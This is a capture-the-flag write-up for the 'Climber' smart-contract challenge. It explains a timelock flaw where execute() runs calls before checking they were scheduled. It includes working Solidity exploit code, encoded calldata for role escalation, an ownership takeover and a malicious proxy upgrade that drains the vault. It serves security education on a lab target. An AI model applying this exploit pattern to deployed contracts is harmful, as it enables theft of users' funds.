## Climber

### Challenge description

>There's a secure vault contract guarding 10 million DVT tokens. The vault is upgradeable, following the UUPS pattern.
>
>The owner of the vault, currently a timelock contract, can withdraw a very limited amount of tokens every 15 days.
>
>On the vault there's an additional role with powers to sweep all tokens in case of an emergency.
>
>On the timelock, only an account with a "Proposer" role can schedule actions that can be executed 1 hour later.
>
>Your goal is to empty the vault. 

### Solution

The vulnerability in this challenge lies on the `execute()` function of the ClimberTimelock contract. This function essentially allows us to call any function in the contract unrestricted, as the `msg.sender` of that function call is the contract itself. Which is assigned the `ADMIN_ROLE` in the constructor of the contract:

```solidity
_setupRole(ADMIN_ROLE, address(this));
```

Therefore, we must make a sequence of calls through the `execute()` function that would effectively allow us to drain the ClimberVault contract's tokens.

We must code an attacker contract that will call the ClimberTimelock contract. The reason we do this (as it is technically possible to call the `execute()` function from an EOA) is because in order for `execute()` to be able to run all the code we need to run `schedule()` to schedule the action at some point, either before calling `execute()` or _through_ `execute()`. However, it is not possible to call `schedule()` through `execute()` directly through the ClimberTimelock contract, as it will require `schedule()` to include its own call, which is not possible, as it would lead to an infinite chain of `schedule()` calls.

As a result, we must make it so that the attacker contract contains a `schedule()` function which passes the parameters of this `execute()` call to a `schedule()` call on the timelock contract.

I coded both an `attack()` and a `schedule()` function as follows:

```solidity
function attack(bytes calldata payload) external payable {
    // save the calldata for later
    (targets, values, dataElements, salt) = abi.decode(payload, (address[], uint256[], bytes[], bytes32));

    // perform the malicious call
    timelock.execute(targets, values, dataElements, salt);
}

function schedule() external {
    timelock.schedule(targets, values, dataElements, salt);
}
```

Where `targets`, `values`, `dataElements` and `salt` (the parameters to be passed to `execute()` and `schedule()`) are defined as state variables and assigned to the variables when calling `attack()`.

```solidity
address[] public targets;
uint256[] public values;
bytes[] public dataElements;
bytes32 public salt;
```

The calls required to be made through `execute()` as an initial setup to solve the challenge are the following:

1. **Target:** ClimberTimelock address.
   **Value:** 0.
   **Data:** We must update the timelock delay to 0 seconds by calling `updateDelay()` with the parameter 0. Therefore: `24adbc5b0000000000000000000000000000000000000000000000000000000000000000`.
   **Why:** The delay must be updated to immediately execute actions scheduled through `schedule()`, otherwise the calls will fail.

2. **Target:** ClimberTimelock address.
   **Value:** 0.
   **Data:** We must call `grantRole()` with the `PROPOSER_ROLE` and the address of the attacker contract. Therefore (for my attacker contract address): `2f2ff15db09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1000000000000000000000000261D8c5e9742e6f7f1076Fa1F560894524e19cad`.
   **Why:** This allows the attacker contract to `schedule()` actions, which is required to `execute()` them, though the scheduling can be done _within_ the `execute()` call (reentrancy). This will be the 4th call.

3. **Target:** ClimberVault address.
   **Value:** 0.
   **Data:** We must call `transferOwnership()` on the vault contract (the timelock contract can call it because it is created and set as owner when the vault is initialized: `transferOwnership(address(new ClimberTimelock(admin, proposer)));`). The call should transfer the ownership to the attacker address. Therefore (for my attacker address): `f2fde38b00000000000000000000000090F79bf6EB2c4f870365E785982E1f101E93b906`.
   **Why:** By transferring ownership to the attacker, the attacker can later swap the implementation of the ClimberVault contract to a contract which allows the attacker to sweep the tokens. For this we will need to code a contract which will replace ClimberVault, but must have the same storage layout.

4. **Target:** Attacker contract address.
   **Value:** 0.
   **Data:** We must call `schedule()` in the attacker contract, a function whose body calls `schedule()` in the timelock contract and successfully schedules all the actions that have been so far executed, so that the execution of `execute()` can successfully finish. Therefore: `b0604a26`, which is just the function selector for `schedule()`. This value may change depending on how you name the function that calls `schedule()` in your attacker contract.
   **Why:** If the actions are not scheduled at some point, the `execute()` function cannot pass the require statement  in the following line: `require(getOperationState(id) == OperationState.ReadyForExecution);`

After all these steps have been completed through the `execute()` call, then we must code a new implementation contract and deploy it. I called this contract ClimberUpgrade and removed most of the functions and logic in ClimberVault. I only retain what I need, which is the same storage layout, the initializer without the additional logic which transfers ownership, sets a sweeper and a last withdrawal, the `_authorizeUpgrade()` function overridden and the `sweepFunds()` function without any modifiers, though `onlyOwner` can be optionally added since the attacker is the owner anyway thanks to the step 3 in `execute()`.

The ClimberUpgrade contract looks like this:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ClimberUpgrade is Initializable, OwnableUpgradeable, UUPSUpgradeable {

    uint256 public constant WITHDRAWAL_LIMIT = 1 ether;
    uint256 public constant WAITING_PERIOD = 15 days;

    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;


    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() initializer {}

    function initialize() initializer external {
        __Ownable_init();
        __UUPSUpgradeable_init();
    }

    function sweepFunds(address tokenAddress) external {
        require(IERC20(tokenAddress).transfer(msg.sender, IERC20(tokenAddress).balanceOf(address(this))), "Transfer failed");
    }

    function _authorizeUpgrade(address newImplementation) internal override {}
}
```

After deploying this contract, we call `upgradeTo()` on the ClimberVault proxy contract to upgrade to the malicious implementation ClimberUpgrade and then call `sweepFunds()` on the ClimberVault proxy contract, which will be calling the new and replaced `sweepFunds()` function with no modifiers, thereby sending the tokens to the caller.

### Extras

In order to get function selectors, something I didn't quite know how to do in brownie at the time. I coded a GetSelector contract which I also deploy in order to obtain function selectors:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GetSelector {
    function getSelector(string calldata _func) external pure returns (bytes4) {
        return bytes4(keccak256(bytes(_func)));
    }
}
```

Then made a lambda function in python which returns the selector in HexBytes:

```python
get_selector = GetSelector.deploy(_fromAttacker)
gs = lambda func: get_selector.getSelector(func)
```

Which I then convert to a hex string with the `.hex()` method:

```python
gs('grantRole(bytes32,address)').hex()
```
